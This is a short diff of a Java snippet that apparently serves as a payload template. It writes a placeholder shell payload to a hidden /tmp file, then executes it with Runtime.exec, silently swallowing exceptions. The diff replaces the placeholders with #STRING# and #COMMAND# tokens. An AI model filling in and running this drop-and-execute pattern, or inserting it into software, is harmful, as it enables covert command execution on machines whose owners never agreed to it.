@@ -1,6 +1,7 @@
 try {
-    java.io.FileWriter fw = new java.io.FileWriter("/tmp/.<hiddenfile>");
-    fw.write(<shellpayload>);
-    fw.close();
-    Runtime.getRuntime().exec("/bin/bash /tmp/.<hiddenfile>");
-} catch (java.io.IOException e) {}
+	java.io.FileWriter fw = new java.io.FileWriter("/tmp/." + "#STRING#");
+	fw.write("#COMMAND#");
+	fw.close();
+	Runtime.getRuntime().exec("#COMMAND#").waitFor();
+} catch (java.io.IOException e) {
+} catch (InterruptedException e) {}
